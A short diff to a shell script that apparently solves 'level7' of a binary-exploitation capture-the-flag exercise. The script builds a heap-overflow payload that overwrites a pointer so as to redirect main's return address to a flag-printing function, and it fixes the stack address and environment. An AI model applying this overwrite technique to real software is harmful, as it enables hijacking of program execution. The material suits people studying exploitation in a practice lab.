@@ -25,7 +25,7 @@ ARG2N_SIZE=4
 ARG2N_FILLER="$(put "${ARG2N_SIZE}" A)"
 
 # We overwrite 'arg2.str' with the address where the main return address is stored
-MAIN_RET_STORE_ADDRESS="bffff73c"
+MAIN_RET_STORE_ADDRESS="bffffe5c"
 ARG2STR_REPLACEMENT="$(hex_little_endian "${MAIN_RET_STORE_ADDRESS}")"
 
 # We set the main return address to 'm'
@@ -34,4 +34,4 @@ MAIN_RET_REPLACEMENT="$(hex_little_endian "${M_ADDRESS}")"
 
 # Calling 'n' gives the flag
 PAYLOAD="${BUFFER_FILLER}${MALLOC_HEADER_FILLER}${ARG2N_FILLER}${ARG2STR_REPLACEMENT}"
-./level7 "${PAYLOAD}" "${MAIN_RET_REPLACEMENT}"
+env -i ./level7 "${PAYLOAD}" "${MAIN_RET_REPLACEMENT}"
